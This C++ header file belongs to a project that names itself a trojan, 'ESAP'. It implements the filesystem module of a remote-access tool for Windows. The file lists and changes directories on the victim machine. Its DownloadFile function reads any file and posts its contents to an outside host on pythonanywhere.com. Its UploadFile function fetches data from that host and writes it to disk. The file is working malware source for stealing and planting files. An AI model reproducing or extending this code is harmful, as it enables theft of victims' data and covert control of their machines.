/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<filesystem.hpp>
This header contains functions under the filesystem category.

*/

#include <iostream>
#include <windows.h>
#include <filesystem>

#include "file.hpp"
#include "request.hpp"

#pragma once

std::string curDirectory = std::filesystem::current_path().string();

std::string GetDirectory() {
    return std::filesystem::current_path().string();
}

bool ChangeDirectory(std::string change) {
    try {
        std::filesystem::current_path(change);
        return true;
    } catch (const std::exception& e) {
        return false;
    }
}

std::vector<std::string> ListDirectory() {
    std::vector<std::string> res;
    for (auto& entry: std::filesystem::directory_iterator(std::filesystem::current_path())) {
        res.push_back(entry.path().filename().string());
    }
    return res;
}

std::string DownloadFile(std::string file) {
    std::ifstream pRead(file, std::ios::binary);
    if (!pRead.is_open()) {
        return "unable to open file";
    }
    std::string data;
    ReadLong(pRead, data);
    std::string fileID = POST_RequestRaw("http://0x3af72.pythonanywhere.com/user_upload_temp/", data);
    return fileID;
}

bool UploadFile(std::string file, std::string fileID) {
    std::string data = GET_Request("http://0x3af72.pythonanywhere.com/serve_temp/?f=" + fileID);
    std::ofstream pWrite(file, std::ios::binary);
    if (!pWrite.is_open()) {
        return false;
    }
    WriteLong(pWrite, data);
    return true;
}